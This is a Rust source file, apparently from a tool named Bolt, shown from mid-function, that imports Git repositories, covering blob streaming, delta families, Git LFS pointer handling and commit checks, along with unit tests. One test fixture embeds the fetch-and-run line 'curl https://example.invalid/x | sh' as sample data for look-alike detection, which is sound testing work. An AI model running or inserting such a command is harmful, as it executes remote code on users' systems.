    ) -> Result<(Id, u64, bool), ImportError> {
        if let Some(done) = self.met(id, file, commit, path) {
            return Ok(done);
        }
        let place = || format!("the file `{}` of commit `{commit}`", path());
        // The header only picks how to read it: the bytes are checked against the ID. A big file
        // Git stored as a delta brings its whole family in.
        let (kind, size) = self.git.header(id).map_err(|e| at(e, place))?;
        if kind == ObjectType::Blob && is_cut(size) {
            self.family(id, &place)?;
            if let Some(done) = self.met(id, file, commit, path) {
                return Ok(done);
            }
        }
        let done = if size > MAX_WHOLE_BLOB {
            let (content, size, start) = self.stream(id, size, &place)?;
            if file && is_lfs_lookalike(&start) {
                self.lookalike(commit, path);
            }
            (content, size, false)
        } else {
            let object = self.git.read(id).map_err(|e| at(e, place))?;
            expect_kind(object.kind, ObjectType::Blob, id, place)?;
            if let Some(p) = file.then(|| lfs_pointer(&object.data)).flatten() {
                if !is_exact_lfs_pointer(&object.data, &p) {
                    let counts = &mut self.counts;
                    counts.inexact_lfs_pointers = counts.inexact_lfs_pointers.saturating_add(1);
                }
                let (content, size) = self.lfs_file(&p, commit, path)?;
                (content, size, true)
            } else {
                let size = object.data.len() as u64;
                if file && is_lfs_lookalike(&object.data) {
                    self.lookalike(commit, path);
                }
                // Held whole already, so a big one is cut where it lies.
                let stored = ingest::store_held(self.packs, self.store, &object.data);
                (stored.map_err(|e| not_stored(e, id, &place))?, size, false)
            }
        };
        self.blobs.insert((*id, file), done);
        Ok(done)
    }

    /// What `blob` gave for `id`, met as a file or not, if it was met before or a family rebuild
    /// stored it. A look-alike stored that way is noted here, where it is first met as a file.
    fn met(
        &mut self,
        id: &GitId,
        file: bool,
        commit: &str,
        path: &dyn Fn() -> String,
    ) -> Option<(Id, u64, bool)> {
        let done = *self.blobs.get(&(*id, file))?;
        if file && self.lookalike_members.remove(id) {
            self.lookalike(commit, path);
        }
        Some(done)
    }

    /// Brings in the delta family of the blob `id`, a file big enough to be cut, the first time
    /// one of its members is met, if Git stored it as a delta: each blob of the family big enough
    /// to be cut and not met yet is stored as `blob` stores it, and noted as a file, so none is
    /// rebuilt again where a file holds it. Every member is built and checked; a smaller one is
    /// let go once nothing more is built on it, never stored or noted here, and comes in as any
    /// small file does where it is met, Git LFS pointers among them.
    fn family(&mut self, id: &GitId, place: &dyn Fn() -> String) -> Result<(), ImportError> {
        let tmp = self.packs.tmp();
        let (packs, store, blobs) = (&mut *self.packs, self.store, &mut self.blobs);
        let lookalikes = &mut self.lookalike_members;
        let mut each = |member: &GitId, data: &[u8]| -> Result<(), ImportError> {
            // Each one stored has cost a MiB of the work allowed, which bounds how many there are.
            if !is_cut(data.len() as u64) || blobs.contains_key(&(*member, true)) {
                return Ok(());
            }
            let stored = ingest::store_held(packs, store, data);
            let done = (
                stored.map_err(|e| not_stored(e, member, place))?,
                data.len() as u64,
                false,
            );
            // Noted as a file only: a link to one takes the usual way, slower but rare.
            blobs.insert((*member, true), done);
            if is_lfs_lookalike(data) {
                lookalikes.insert(*member);
            }
            Ok(())
        };
        let rebuilt = self.git.rebuild_family(id, &tmp, &mut each);
        rebuilt.map_err(|e| match e {
            ImportError::Git(e) => at(e, place),
            e => e,
        })
    }

    /// Notes a file that looks like a Git LFS pointer but isn't a Git LFS file, listing the first
    /// few by path.
    fn lookalike(&mut self, commit: &str, path: &dyn Fn() -> String) {
        let counts = &mut self.counts;
        counts.lfs_lookalike_count = counts.lfs_lookalike_count.saturating_add(1);
        if counts.lfs_lookalikes.len() < MAX_LOOKALIKES_LISTED {
            counts.lfs_lookalikes.push((commit.to_owned(), path()));
        }
    }

    /// The content ID and size of the file the Git LFS pointer `p`, at `path` in the commit
    /// `commit` (hex), stands for, stored from its object the first time it is met, as
    /// `LfsRules` allows: one of size 0 is an empty file, whose object isn't read.
    fn lfs_file(
        &mut self,
        p: &LfsPointer,
        commit: &str,
        path: &dyn Fn() -> String,
    ) -> Result<(Id, u64), ImportError> {
        let needs_object = self.lfs_rules.needs_object(p, commit, path)?;
        if let Some(content) = self.lfs.get(&(p.oid, p.size)) {
            return Ok((*content, p.size));
        }
        let content = if p.size == 0 {
            let stored = ingest::store_held(self.packs, self.store, &[]);
            stored.map_err(|e| lfs_not_stored(e, &self.git.lfs_object_path(p)))?
        } else if needs_object {
            self.lfs_object(p, commit, path)?
        } else {
            // Only a pointer of size 0 needs no object.
            let fault = io::Error::other("a Git LFS file with contents needed no object");
            return Err(RepoError::from(fault).into());
        };
        self.lfs.insert((p.oid, p.size), content);
        let counts = &mut self.counts;
        counts.lfs_files = counts.lfs_files.saturating_add(1);
        counts.lfs_bytes = counts.lfs_bytes.saturating_add(p.size);
        Ok((content, p.size))
    }

    /// Stores the object of the Git LFS pointer `p` from `.git/lfs/objects` as any file is stored,
    /// computing its SHA-256 as it is read, and gives its content ID only once that is found to
    /// be the oid. One too long to cut is read twice: once for both hashes, then again to store
    /// it unless a good copy is stored already, which refuses any other bytes.
    fn lfs_object(
        &mut self,
        p: &LfsPointer,
        commit: &str,
        path: &dyn Fn() -> String,
    ) -> Result<Id, ImportError> {
        let missing = || {
            let first = vec![(commit.to_owned(), path(), p.size)];
            self.lfs_rules.missing(first, 1, p.size)
        };
        let at = self.git.lfs_object_path(p);
        let file = self.git.lfs_object(p)?.ok_or_else(missing)?;
        let mut reading = Sha256Reading {
            inner: file,
            hasher: Sha256::new(),
        };
        let long = is_too_long_to_cut(p.size);
        let content = if long {
            let mut hasher = ContentHasher::new();
            let read = io::copy(&mut reading, &mut Hashing(&mut hasher));
            let read = read.map_err(|source| GitError::Io {
                path: at.clone(),
                source,
            })?;
            if read != p.size {
                return Err(lfs_changed(&at));
            }
            hasher.finish()
        } else {
            let stored = ingest::store_bytes(self.packs, self.store, &mut reading, p.size);
            stored.map_err(|e| lfs_not_stored(e, &at))?
        };
        let sha256: [u8; 32] = reading.hasher.finalize().into();
        if sha256 != p.oid {
            return Err(ImportError::LfsMismatch {
                commit: commit.to_owned(),
                path: path(),
                oid: p.oid_hex(),
            });
        }
        let again = || self.git.lfs_object(p)?.ok_or_else(|| lfs_changed(&at));
        if long && !ingest::store_long(self.packs, self.store, content, p.size, again)? {
            return Err(lfs_changed(&at));
        }
        Ok(content)
    }

    /// Stores a blob too big to read whole, of the `size` its header gives, reading it once, and
    /// gives its first bytes too, as `Start` keeps them. One too long to cut is read twice: once
    /// to learn its content ID, then again to store it unless a good copy is stored already.
    fn stream(
        &mut self,
        id: &GitId,
        size: u64,
        place: &dyn Fn() -> String,
    ) -> Result<(Id, u64, Vec<u8>), ImportError> {
        if !is_too_long_to_cut(size) {
            let mut blob = Start::new(self.git.blob_reader(id).map_err(|e| at(e, place))?);
            let stored = ingest::store_bytes(self.packs, self.store, &mut blob, size);
            return Ok((
                stored.map_err(|e| not_stored(e, id, place))?,
                size,
                blob.start,
            ));
        }
        let failed = |e: io::Error| match e.downcast::<GitError>() {
            Ok(e) => at(e, place),
            Err(e) => PackError::Io(e).into(),
        };
        let mut hasher = ContentHasher::new();
        // In a block of its own, so a blob rebuilt in memory is let go before the second pass
        // rebuilds it.
        let (size, start) = {
            let mut blob = Start::new(self.git.blob_reader(id).map_err(|e| at(e, place))?);
            let size = io::copy(&mut blob, &mut Hashing(&mut hasher)).map_err(failed)?;
            (size, blob.start)
        };
        let content = hasher.finish();
        let again = || self.git.blob_reader(id).map_err(|e| at(e, place));
        match ingest::store_long(self.packs, self.store, content, size, again) {
            Ok(true) => Ok((content, size, start)),
            Ok(false) => Err(PackError::ContentChanged.into()),
            Err(ImportError::Pack(PackError::Io(e))) => Err(failed(e)),
            Err(e) => Err(e),
        }
    }

    /// Stores a record unless this converter stored it already, this pack holds it or the store
    /// has a good copy, and returns its ID. Content is stored once through its blob's Git ID; a
    /// record can come from two Git objects, such as two trees whose modes Bolt reads alike.
    fn put(&mut self, kind: ObjectKind, bytes: &[u8]) -> Result<Id, ImportError> {
        let flavor = kind
            .flavor()
            .ok_or_else(|| bug("Bolt took a file for a record".to_owned()))?;
        let id = hash_record(flavor, bytes);
        if self.records.contains(&id) {
            return Ok(id);
        }
        if !self.packs.contains(&id) && !self.store.has_good_copy(&id, kind, bytes.len() as u64)? {
            self.packs.add_record(kind, bytes)?;
        }
        self.records.insert(id);
        Ok(id)
    }
}

/// What stops the import when the blob `id`, read where `place` says, couldn't be stored. A Git
/// object's bytes can't change, so a blob that isn't the size its header says is damaged.
fn not_stored(e: IngestError, id: &GitId, place: &dyn Fn() -> String) -> ImportError {
    match e {
        IngestError::Changed => {
            let what = format!(
                "blob `{}` doesn't hold the number of bytes its header says",
                id.to_hex()
            );
            at(GitError::Broken { what }, place)
        }
        IngestError::Read(e) => match e.downcast::<GitError>() {
            Ok(e) => at(e, place),
            Err(e) => PackError::Io(e).into(),
        },
        IngestError::Pack(e) => e.into(),
        IngestError::Store(e) => e.into(),
    }
}

/// What stops the import when the Git LFS object at `at` couldn't be stored.
fn lfs_not_stored(e: IngestError, at: &Path) -> ImportError {
    match e {
        IngestError::Changed => lfs_changed(at),
        IngestError::Read(source) => GitError::Io {
            path: at.to_owned(),
            source,
        }
        .into(),
        IngestError::Pack(e) => e.into(),
        IngestError::Store(e) => e.into(),
    }
}

/// The Git LFS object at `at` changed while Bolt read it.
fn lfs_changed(at: &Path) -> ImportError {
    let what = format!("the Git LFS file {} changed", at.display());
    GitError::Changed { what }.into()
}

/// Adds a finished folder to the folder above it, or returns it if it is the top one.
fn attach(stack: &mut [Frame], name: String, done: Folder) -> Option<Folder> {
    let Some(parent) = stack.last_mut() else {
        return Some(done);
    };
    if done.longest > 0 {
        let below = name.len().saturating_add(1).saturating_add(done.longest);
        parent.longest = parent.longest.max(below);
    }
    parent.entries.push(Entry {
        name,
        kind: EntryKind::Folder,
        id: done.listing,
        size: 0,
    });
    parent.total = parent.total.saturating_add(done.total);
    parent.depth = parent.depth.max(done.depth.saturating_add(1));
    parent.exact &= done.exact;
    parent.lfs |= done.lfs;
    None
}

/// The path of `names` in the folder on top of the stack, for a list or a message.
fn path_of(stack: &[Frame], names: &[&str]) -> String {
    let folders = stack.iter().skip(1).map(|frame| frame.name.as_str());
    shown_path(&folders.chain(names.iter().copied()).collect::<Vec<_>>())
}

/// The path of the names `parts`, `/` between them, for a list or a message. A deep one keeps
/// only the whole names at its end that fit in `MAX_SHOWN_PATH`, after `…/`: a tree 4,096 levels
/// deep would otherwise make each path a megabyte.
pub(super) fn shown_path(parts: &[&str]) -> String {
    let mut start = parts.len();
    let mut len = 0usize;
    while let Some(part) = start.checked_sub(1).and_then(|i| parts.get(i)) {
        len = len.saturating_add(part.len()).saturating_add(1);
        // The last name is kept whatever its length: callers cut names from Git to 255 bytes,
        // and a valid one is at most 765.
        if len > MAX_SHOWN_PATH && start < parts.len() {
            break;
        }
        start = start.saturating_sub(1);
    }
    let kept = parts.get(start..).unwrap_or_default().join("/");
    if start == 0 {
        kept
    } else {
        format!("…/{kept}")
    }
}

/// The commit `id`, read whole. The header isn't checked against the ID, but it bounds what
/// reading would hold, so a commit too big for a save to keep is refused before it is read.
fn read_commit(git: &git::Repo, id: &GitId) -> Result<git::Object, ImportError> {
    let hex = id.to_hex();
    let here = || format!("commit `{hex}`");
    let (kind, size) = git.header(id).map_err(|e| at(e, here))?;
    expect_kind(kind, ObjectType::Commit, id, here)?;
    if size > MAX_COMMIT_BYTES {
        return Err(unimportable(format!(
            "commit `{hex}` is {size} bytes, more than any commit Bolt can keep (64 KiB of \
             header lines and 1 MiB of message)"
        )));
    }
    let object = git.read(id).map_err(|e| at(e, here))?;
    expect_kind(object.kind, ObjectType::Commit, id, here)?;
    Ok(object)
}

/// What an import reads of every commit before it writes anything.
pub(super) struct Outline {
    pub(super) tree: GitId,
    /// In the commit's own order.
    pub(super) parents: Vec<GitId>,
    /// The change ID its `change-id` header gives, if it gives one.
    pub(super) change_id: Option<ChangeId>,
}

/// The outline of the commit `id`, once it is known a save can keep it.
pub(super) fn outline(git: &git::Repo, id: &GitId) -> Result<Outline, ImportError> {
    let hex = id.to_hex();
    let object = read_commit(git, id)?;
    let c =
        parse_commit(&object.data, git.hash()).map_err(|e| at(e, || format!("commit `{hex}`")))?;
    keepable(&c, &hex)?;
    Ok(Outline {
        tree: c.tree,
        parents: c.parents,
        change_id: c.change_id.and_then(ChangeId::from_jujutsu),
    })
}

/// Stops at a commit a save can't keep exactly (decision 032), before its people are read or its
/// snapshot is walked.
fn keepable(c: &Commit<'_>, hex: &str) -> Result<(), ImportError> {
    let (header, message) = (c.header.len(), c.message.len());
    let what = if header > MAX_EXTRA_VALUE_BYTES {
        format!(
            "{header} bytes of header lines before its message, more than the 64 KiB Bolt keeps"
        )
    } else if message > MAX_MESSAGE_BYTES {
        format!("a message of {message} bytes, more than the 1 MiB a save holds")
    } else if message > MAX_EXTRA_VALUE_BYTES && std::str::from_utf8(c.message).is_err() {
        format!(
            "a message of {message} bytes that isn't UTF-8, and Bolt keeps the bytes of such a \
             message only up to 64 KiB"
        )
    } else {
        return Ok(());
    };
    Err(unimportable(format!("commit `{hex}` has {what}")))
}

/// A Git message as Bolt holds it (decision 019): UTF-8 as it is; otherwise decoded from its
/// declared encoding, or from UTF-8 if Bolt doesn't know that one, with U+FFFD for bytes that
/// don't decode.
fn message_text<'a>(bytes: &'a [u8], encoding: Option<&[u8]>) -> Cow<'a, str> {
    if let Ok(text) = std::str::from_utf8(bytes) {
        return Cow::Borrowed(text);
    }
    let encoding = encoding
        .and_then(Encoding::for_label_no_replacement)
        .unwrap_or(UTF_8);
    encoding.decode_without_bom_handling(bytes).0
}

#[cfg(test)]
mod tests {
    #![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
    #![allow(clippy::indexing_slicing, clippy::arithmetic_side_effects)]
    use super::*;
    use crate::chunks::set_test_cut_sizes;
    use crate::git::craft::{Craft, PackEntry, delta, lfs_pointer_to};
    use crate::git::{HashKind, object_id};
    use crate::id::hash_content;
    use crate::pack::{PackReader, WRITER_PACK_OBJECTS};
    use crate::save::Person;
    use crate::test_support::{HOSTILE, assert_hostile_text_escaped, noise};
    use std::fs;
    use std::path::Path;
    use std::time::{Duration, Instant};

    use HashKind::{Sha1, Sha256};

    fn repo(hash: HashKind) -> (tempfile::TempDir, Craft) {
        let dir = tempfile::tempdir().unwrap();
        let git = Craft::new(dir.path(), hash);
        (dir, git)
    }

    /// Runs `run` with a converter from the Git repository at `dir` into a fresh store at
    /// `dir/<name>`, and returns what it returned and the store holding what it wrote.
    fn convert<R>(dir: &Path, name: &str, run: impl FnOnce(&mut Converter<'_>) -> R) -> (R, Store) {
        convert_in_packs_of(WRITER_PACK_OBJECTS, dir, name, run)
    }

    /// `convert`, starting a new pack every `limit` objects.
    fn convert_in_packs_of<R>(
        limit: u64,
        dir: &Path,
        name: &str,
        run: impl FnOnce(&mut Converter<'_>) -> R,
    ) -> (R, Store) {
        let git = git::Repo::open(dir).unwrap();
        let (tmp, packs_dir) = (dir.join(name).join("tmp"), dir.join(name).join("packs"));
        fs::create_dir_all(&tmp).unwrap();
        fs::create_dir_all(&packs_dir).unwrap();
        let store = Store::open(&packs_dir).unwrap();
        let mut packs = PackSet::with_limit(&tmp, &packs_dir, limit).unwrap();
        let result = run(&mut Converter::new(
            &git,
            &store,
            &mut packs,
            HashSet::new(),
            None,
        ));
        packs.finish().unwrap();
        (result, Store::open(&packs_dir).unwrap())
    }

    /// How many objects of `kind` the store at `dir/<name>` holds, in all its packs.
    fn stored(dir: &Path, name: &str, kind: ObjectKind) -> usize {
        let packs = fs::read_dir(dir.join(name).join("packs")).unwrap();
        packs
            .map(|pack| PackReader::open(&pack.unwrap().path()).unwrap())
            .map(|pack| {
                pack.entries()
                    .filter(|e| e.as_ref().unwrap().kind == kind)
                    .count()
            })
            .sum()
    }

    const PEOPLE: &str = "author A U Thor <author@example.com> 1112912053 -0700\n\
                          committer C O Mitter <committer@example.com> 1112912100 +0530\n";

    /// A signature as Git writes it, each line after the first starting with a space.
    const GPGSIG: &str = "gpgsig -----BEGIN PGP SIGNATURE-----\n \n iQEzBAABCAAdFiEE\n =abcd\n \
                          -----END PGP SIGNATURE-----\n";

    /// A signed tag kept with a merge, as `git merge` of a signed tag writes it.
    const MERGETAG: &str = "mergetag object 0123456789abcdef0123456789abcdef01234567\n type \
                            commit\n tag v1\n tagger T <t@x> 1 +0000\n \n v1\n -----BEGIN PGP \
                            SIGNATURE-----\n iQEz\n -----END PGP SIGNATURE-----\n";

    /// A commit's bytes: `tree` (as written), `parents`, the `people` lines, `headers` (whole
    /// lines), an empty line and `message`.
    fn raw_commit(
        tree: &str,
        parents: &[GitId],
        people: &[u8],
        headers: &str,
        message: &[u8],
    ) -> Vec<u8> {
        let mut raw = format!("tree {tree}\n").into_bytes();
        for parent in parents {
            raw.extend_from_slice(format!("parent {}\n", parent.to_hex()).as_bytes());
        }
        [&raw, people, headers.as_bytes(), b"\n", message].concat()
    }

    /// A commit of `tree` and `parents` by the usual people, with `headers` and `message`.
    fn commit_bytes(tree: &GitId, parents: &[GitId], headers: &str, message: &[u8]) -> Vec<u8> {
        raw_commit(&tree.to_hex(), parents, PEOPLE.as_bytes(), headers, message)
    }

    fn blob(git: &Craft, bytes: &[u8]) -> GitId {
        git.object(ObjectType::Blob, bytes)
    }

    /// A commit without parents of a tree of `entries`: mode, name and ID, in Git's order.
    fn commit_of(git: &Craft, entries: &[(&[u8], &[u8], GitId)]) -> GitId {
        let tree = git.tree(entries);
        git.commit(&commit_bytes(&tree, &[], "", b"m\n"))
    }

    fn content(store: &Store, id: &Id) -> Vec<u8> {
        let mut out = Vec::new();
        store.copy_content(id, &mut out).unwrap();
        out
    }

    /// The commit a stored save says it came from.
    fn git_commit(store: &Store, save: &Id, hash: HashKind) -> GitId {
        let save = store.save(save, false).unwrap();
        let hex = String::from_utf8(save.extra[EXTRA_GIT_COMMIT].clone()).unwrap();
        GitId::from_hex(hash, &hex).unwrap()
    }

    /// Fails unless `result` is Git's side refusing, in a message holding each of `parts`.
    #[track_caller]
    fn assert_refused<T: std::fmt::Debug>(result: Result<T, ImportError>, parts: &[&str]) {
        let e = result.unwrap_err();
        assert!(
            matches!(
                e,
                ImportError::Git(GitError::Broken { .. } | GitError::Unimportable { .. })
            ),
            "{e:?}"
        );
        for part in parts {
            assert!(e.to_string().contains(part), "{part:?} in {e}");
        }
        assert!(
            e.hint().unwrap().starts_with("Nothing was changed."),
            "{e:?}"
        );
    }

    #[test]
    fn change_ids_follow_jujutsus_rule() {
        let id = [0x01u8; 20];
        let expected: Vec<u8> = id[4..].iter().rev().map(|b| b.reverse_bits()).collect();
        assert_eq!(ChangeId::from_git_commit(&id).0.to_vec(), expected);
        assert_eq!(
            ChangeId::from_jujutsu(b"zyxwvutsrqponmlkzyxwvutsrqponmlk").map(|c| c.0),
            Some([
                0x01, 0x23, 0x45, 0x67, 0x89, 0xab, 0xcd, 0xef, 0x01, 0x23, 0x45, 0x67, 0x89, 0xab,
                0xcd, 0xef
            ])
        );
        // Jujutsu reads its letters in either case.
        assert_eq!(
            ChangeId::from_jujutsu(b"ZYXWVUTSRQPONMLKzyxwvutsrqponmlk").map(|c| c.0[..2].to_vec()),
            Some(vec![0x01, 0x23])
        );
        // The last 16 bytes count, so a SHA-256 ID's first 16 don't.
        let sha256: Vec<u8> = (0..32).collect();
        let want: Vec<u8> = (16..32u8).rev().map(u8::reverse_bits).collect();
        assert_eq!(ChangeId::from_git_commit(&sha256).0.to_vec(), want);
        // A header that isn't 16 bytes in Jujutsu's letters gives none, so the converter passes
        // it over for the commit's own ID, as Jujutsu does.
        for header in [
            &b"zyxwvutsrqponmlk"[..],
            b"zyxwvutsrqponmlkzyxwvutsrqponmlkzz",
            b"zyxwvutsrqponmlkzyxwvutsrqponmlj",
            b"zyxwvutsrqponmlkzyxwvutsrqponml ",
            b"",
        ] {
            assert_eq!(
                ChangeId::from_jujutsu(header),
                None,
                "{}",
                String::from_utf8_lossy(header)
            );
        }
    }

    /// A streamed one that Git LFS's smudge filter reads as a pointer once Git turns its LFs into
    /// CR LF is noted as a look-alike from the bytes kept as it passes.
    #[test]
    fn blobs_are_stored_and_big_ones_streamed() {
        let (dir, git) = repo(Sha1);
        let small = b"hello\n".to_vec();
        // One byte past what is read whole: a pointer led by a newline, then an `X` the CRs push
        // out of the 1,024 bytes Git LFS reads.
        let mut big = format!("\n{}", lfs_pointer_to(b"a picture\n").0).into_bytes();
        big.resize(MAX_LFS_POINTER_BYTES - 1, b' ');
        big.push(b'X');
        big.extend((big.len()..(64usize << 20) + 1).map(|i| (i % 251) as u8));
        let small_id = blob(&git, &small);
        let big_id = blob(&git, &big);
        let first = commit_of(
            &git,
            &[
                (b"100644", b"big", big_id),
                (b"100644", b"small", small_id),
                (b"100644", b"small-again", small_id),
            ],
        );
        let second = commit_of(&git, &[(b"100644", b"big-renamed", big_id)]);
        let ((save, lookalikes), store) = convert(dir.path(), "a", |c| {
            let save = c.commit(&first).unwrap();
            c.commit(&second).unwrap();
            (save, c.counts().lfs_lookalikes.clone())
        });
        assert_eq!(lookalikes, [(first.to_hex(), "big".to_owned())]);
        let root = store
            .listing(&store.save(&save, false).unwrap().root)
            .unwrap();
        let entry = |name: &str| root.get(name).unwrap().clone();
        assert_eq!(entry("small").size, 6);
        assert_eq!(content(&store, &entry("small").id), small);
        assert_eq!(entry("big").size, big.len() as u64);
        assert!(content(&store, &entry("big").id) == big);
        // Each blob is stored once, however often it comes: the big one as its chunks and their
        // list.
        assert_eq!(entry("small-again").id, entry("small").id);
        let held = || {
            let kinds = [ObjectKind::Content, ObjectKind::ChunkList];
            kinds.map(|kind| stored(dir.path(), "a", kind))
        };
        let [chunks_and_small, lists] = held();
        assert_eq!(lists, 1);
        assert!(chunks_and_small > 2, "{chunks_and_small}");
        // A store that holds them already gets neither again.
        convert(dir.path(), "a", |c| c.commit(&first).unwrap());
        assert_eq!(held(), [chunks_and_small, lists]);
        // Too long to cut, the big one is read to learn its ID, then again to be stored whole.
        set_test_cut_sizes(Some((1 << 20, 2 << 20)));
        let (save, store) = convert(dir.path(), "b", |c| c.commit(&first).unwrap());
        set_test_cut_sizes(None);
        let root = store
            .listing(&store.save(&save, false).unwrap().root)
            .unwrap();
        assert!(content(&store, &root.get("big").unwrap().id) == big);
        assert_eq!(stored(dir.path(), "b", ObjectKind::ChunkList), 0);
    }

    #[test]
    fn a_family_member_no_commit_needs_may_fail_its_check() {
        let (dir, git) = repo(Sha1);
        // A file of 1.5 MiB in four versions, Git's deltas building the rest on the first: the
        // second listed under a name not its own, the third built on it and the one a commit
        // names, as a file and as a link, the fourth named by none. A fifth delta on the first
        // can't be applied.
        let first: Vec<u8> = (0..3usize << 19).map(|i| (i % 251) as u8).collect();
        let on = |base: &[u8], tail: &[u8]| [base, tail].concat();
        let second = on(&first, b"second");
        let third = on(&second, b"third");
        let fourth = on(&first, b"fourth");
        let id = |data: &[u8]| object_id(ObjectType::Blob, data, Sha1).unwrap();
        let not_its_own = id(b"not the second");
        let entries = [
            PackEntry::Whole(ObjectType::Blob, first.clone()),
            PackEntry::OfsDelta {
                base: 0,
                delta: delta(&first, &second),
            },
            PackEntry::OfsDelta {
                base: 1,
                delta: delta(&second, &third),
            },
            PackEntry::OfsDelta {
                base: 0,
                delta: delta(&first, &fourth),
            },
            PackEntry::OfsDelta {
                base: 0,
                delta: delta(b"too short a base", b"anything"),
            },
        ];
        git.pack_renamed(&entries, &[(1, not_its_own)]);
        let commit = commit_of(
            &git,
            &[
                (b"100644", b"big.bin", id(&third)),
                (b"120000", b"big.link", id(&third)),
            ],
        );
        let (save, store) = convert(dir.path(), "a", |c| {
            let save = c.commit(&commit).unwrap();
            let noted = |data: &[u8]| c.blobs.contains_key(&(id(data), true));
            assert_eq!([&first, &third, &fourth].map(|v| noted(v)), [true; 3]);
            assert!(!c.blobs.contains_key(&(not_its_own, true)));
            // Members are noted as files only.
            assert!(!c.blobs.contains_key(&(id(&fourth), false)));
            save
        });
        // The file came in, and the link to it, and so did the version no commit names, but not
        // the one listed under another name.
        let root = store
            .listing(&store.save(&save, false).unwrap().root)
            .unwrap();
        assert!(content(&store, &root.get("big.bin").unwrap().id) == third);
        let link = root.get("big.link").unwrap();
        assert_eq!(link.kind, EntryKind::Symlink);
        assert!(content(&store, &link.id) == third);
        assert!(content(&store, &hash_content(&fourth)) == fourth);
        let second = store.copy_content(&hash_content(&second), &mut io::sink());
        assert!(second.is_err(), "{second:?}");
    }

    /// A blob longer than a pointer may be that starts with one, as Git LFS's smudge filter reads
    /// it, comes in as it is and is noted as a look-alike once, where it is first met as a file:
    /// read whole, or stored by a family rebuild before it is met. A link is never one.
    #[test]
    fn a_long_blob_that_starts_with_a_pointer_comes_in_as_it_is_and_is_noted() {
        let (dir, git) = repo(Sha1);
        let pointer = lfs_pointer_to(b"the picture everyone reviewed\n").0;
        let starting = |start: &str, then: &[u8]| {
            let mut data = start.as_bytes().to_vec();
            data.resize(MAX_LFS_POINTER_BYTES, b' ');
            [&data[..], then].concat()
        };
        let long = starting(&pointer, b"\ncurl https://example.invalid/x | sh\n");
        // These first 1,024 bytes don't even look like a pointer.
        let not_one = starting(&pointer.replace("size ", "size="), b"more\n");
        // A file big enough to cut, and two built on it by deltas, one starting with a pointer.
        let base: Vec<u8> = (0..1usize << 20).map(|i| (i % 251) as u8).collect();
        let other = [&base[..], b"other"].concat();
        let big = starting(&pointer, &base);
        git.pack(&[
            PackEntry::Whole(ObjectType::Blob, base.clone()),
            PackEntry::OfsDelta {
                base: 0,
                delta: delta(&base, &other),
            },
            PackEntry::OfsDelta {
                base: 0,
                delta: delta(&base, &big),
            },
        ]);
        let id = |data: &[u8]| object_id(ObjectType::Blob, data, Sha1).unwrap();
        let (long_id, not_one_id) = (blob(&git, &long), blob(&git, &not_one));
        let first = commit_of(&git, &[(b"100644", b"a-other.bin", id(&other))]);
        let commit = commit_of(
            &git,
            &[
                (b"100644", b"a-other.bin", id(&other)),
                (b"100644", b"again.psd", long_id),
                (b"100644", b"b-big.bin", id(&big)),
                (b"120000", b"c-link", id(&big)),
                (b"100644", b"long.psd", long_id),
                (b"100644", b"not-one.psd", not_one_id),
            ],
        );
        let ((save, counts), store) = convert(dir.path(), "a", |c| {
            // The family comes in with the other, before the one that starts with a pointer is met.
            c.commit(&first).unwrap();
            assert!(c.lookalike_members.contains(&id(&big)));
            assert_eq!(c.counts().lfs_lookalike_count, 0);
            let save = c.commit(&commit).unwrap();
            assert!(c.lookalike_members.is_empty());
            (save, c.counts().clone())
        });
        let hex = commit.to_hex();
        let met = |path: &str| (hex.clone(), path.to_owned());
        assert_eq!(counts.lfs_lookalikes, [met("again.psd"), met("b-big.bin")]);
        assert_eq!((counts.lfs_lookalike_count, counts.lfs_files), (2, 0));
        for (path, data) in [("long.psd", &long), ("b-big.bin", &big), ("c-link", &big)] {
            let entry = entry_at(&store, &save, path);
            assert!(content(&store, &entry.id) == *data, "{path}");
        }
    }

    #[test]
    fn a_family_of_tiny_members_stores_only_the_big_ones() {
        let (dir, git) = repo(Sha1);
        // A file of 1 MiB, a bigger one built on it, and 3,000 files of a few bytes each built on
        // it too, as a hostile pack can make them. A commit names the bigger one and a tiny one.
        let bottom: Vec<u8> = (0..1usize << 20).map(|i| (i % 251) as u8).collect();
        let big = [&bottom[..], b"bigger"].concat();
        let tiny: Vec<Vec<u8>> = (0..3000)
            .map(|i| format!("tiny {i}\n").into_bytes())
            .collect();
        let mut entries = vec![
            PackEntry::Whole(ObjectType::Blob, bottom.clone()),
            PackEntry::OfsDelta {
                base: 0,
                delta: delta(&bottom, &big),
            },
        ];
        entries.extend(tiny.iter().map(|small| PackEntry::OfsDelta {
            base: 0,
            delta: delta(&bottom, small),
        }));
        git.pack(&entries);
        let id = |data: &[u8]| object_id(ObjectType::Blob, data, Sha1).unwrap();
        let commit = commit_of(
            &git,
            &[
                (b"100644", b"big.bin", id(&big)),
                (b"100644", b"small.txt", id(&tiny[7])),
            ],
        );
        let (save, store) = convert(dir.path(), "a", |c| {
            let save = c.commit(&commit).unwrap();
            // The family noted the two big ones only; the tiny one came in as small files do.
            assert_eq!(c.blobs.len(), 3);
            for data in [&bottom, &big, &tiny[7]] {
                assert!(c.blobs.contains_key(&(id(data), true)));
            }
            save
        });
        let root = store
            .listing(&store.save(&save, false).unwrap().root)
            .unwrap();
        assert!(content(&store, &root.get("big.bin").unwrap().id) == big);
        assert_eq!(content(&store, &root.get("small.txt").unwrap().id), tiny[7]);
    }

    #[test]
    fn every_kind_of_entry_converts() {
        for hash in [Sha1, Sha256] {
            let (dir, git) = repo(hash);
            let text = blob(&git, b"text\n");
            let script = blob(&git, b"#!/bin/sh\n");
            // A link's target is its blob's bytes, whatever they are.
            let target = blob(&git, b"../elsewhere/\xff");
            let inner = git.tree(&[(b"100644", b"inner.txt", text)]);
            let submodule = GitId::from_hex(hash, &"ab".repeat(hash.len())).unwrap();
            let id = commit_of(
                &git,
                &[
                    (b"100644", b"file.txt", text),
                    (b"40000", b"folder", inner),
                    (b"120000", b"link", target),
                    (b"100755", b"run.sh", script),
                    (b"160000", b"sub", submodule),
                ],
            );
            let ((save, counts), store) = convert(dir.path(), "a", |c| {
                let save = c.commit(&id).unwrap();
                c.finish().unwrap();
                (save, c.counts().clone())
            });
            let root = store
                .listing(&store.save(&save, false).unwrap().root)
                .unwrap();
            let kinds: Vec<(&str, EntryKind, u64)> = root
                .entries()
                .iter()
                .map(|e| (e.name.as_str(), e.kind, e.size))
                .collect();
            assert_eq!(
                kinds,
                [
                    ("file.txt", EntryKind::File, 5),
                    ("folder", EntryKind::Folder, 0),
                    ("link", EntryKind::Symlink, 14),
                    ("run.sh", EntryKind::Executable, 10),
